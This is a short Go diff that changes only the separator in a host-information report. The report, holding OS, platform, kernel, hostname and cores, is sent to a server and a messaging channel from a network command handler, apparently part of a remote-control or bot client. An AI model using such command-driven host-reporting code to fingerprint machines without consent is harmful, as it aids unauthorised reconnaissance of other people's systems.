@@ -35,6 +35,6 @@ func HandleCommand(c net.Conn, message string) {
 
 func getInf(c net.Conn) {
 	info := gi.GetInfo()
-	sendToServer(c, "OS->"+info.OS+"- Platform ->"+info.Platform+"- Kernel ->"+info.Kernel+"- Host ->"+info.Hostname+"- Core ->"+info.Core)
-	sendMessageToChannel("OS->" + info.OS + "- Platform ->" + info.Platform + "- Kernel ->" + info.Kernel + "- Host ->" + info.Hostname + "- Core ->" + info.Core)
+	sendToServer(c, "OS->"+info.OS+"| Platform ->"+info.Platform+"| Kernel ->"+info.Kernel+"| Host ->"+info.Hostname+"| Core ->"+info.Core)
+	sendMessageToChannel("OS->"+info.OS+"| Platform ->"+info.Platform+"| Kernel ->"+info.Kernel+"| Host ->"+info.Hostname+"| Core ->"+info.Core)
 }
